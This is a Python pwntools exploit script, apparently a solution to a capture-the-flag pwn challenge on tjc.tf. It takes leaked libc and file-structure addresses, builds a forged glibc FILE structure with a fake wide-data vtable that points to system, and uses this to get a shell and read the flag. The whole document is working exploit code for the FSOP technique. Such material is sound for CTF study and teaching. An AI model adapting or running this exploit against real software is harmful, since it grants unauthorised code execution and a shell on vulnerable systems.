#!/usr/bin/env python3
from pwn import *

PORT =  31378
HOST = "tjc.tf"
elf = context.binary = ELF('./Ox78_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000013D6
            brva 0x00000000000013FE
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()
# GDB()
p.recvuntil(b"Here's the address of the File Structure: ")
fp = int(p.recvline()[:-1], 16)
log.info("fp: " + hex(fp))
p.recvuntil(b"I'll give you a libc leak as well: ")
libc_leak = int(p.recvline()[:-1], 16)
log.info("libc_leak: " + hex(libc_leak))
libc.address = libc_leak - 0x84ed0
log.info("libc_base: " + hex(libc.address))

puts = libc.sym.puts
system = libc.sym.system
io_wfile_jumps = libc.sym._IO_wfile_jumps

# Stage 1:

pl1 = bytearray(b'\x00' * 0x78)

pl1[0x00:0x08] = p64(0xfbad0000)
pl1[0x38:0x40] = p64(fp)
pl1[0x40:0x48] = p64(fp + 0x300)
pl1[0x68:0x70] = p64(0)
pl1[0x70:0x74] = p32(0)
pl1[0x74:0x78] = p32(0)

pl1 = bytes(pl1)

# Stage 2:

pl2 = bytearray(b'\x00' * 0x300)

pl2[0x00:0x08] = b"  sh\x00\x00\x00\x00"

pl2[0x08:0x10] = p64(fp)
pl2[0x10:0x18] = p64(fp + 0x300)
pl2[0x18:0x20] = p64(fp)
pl2[0x38:0x40] = p64(fp)
pl2[0x40:0x48] = p64(fp + 0x300)

pl2[0x68:0x70] = p64(0)
pl2[0x70:0x74] = p32(0)
pl2[0x74:0x78] = p32(0)
pl2[0x88:0x90] = p64(fp + 0x280)
pl2[0x90:0x98] = p64(0xffffffffffffffff)

fake_wide_data = fp + 0x100
fake_wide_vtable = fp + 0x1e0

pl2[0xa0:0xa8] = p64(fake_wide_data)
pl2[0xc0:0xc4] = p32(1)
pl2[0xd8:0xe0] = p64(io_wfile_jumps)

wide = 0x100
pl2[wide + 0x18:wide + 0x20] = p64(0)
pl2[wide + 0x20:wide + 0x28] = p64(1)
pl2[wide + 0x30:wide + 0x38] = p64(0)
pl2[wide + 0xe0:wide + 0xe8] = p64(fake_wide_vtable)

pl2[0x1e0 + 0x68:0x1e0 + 0x70] = p64(system)

pl2 = bytes(pl2)
# GDB()
p.send(pl1)
p.send(pl2)
p.sendline(b"cat flag.txt")
p.interactive()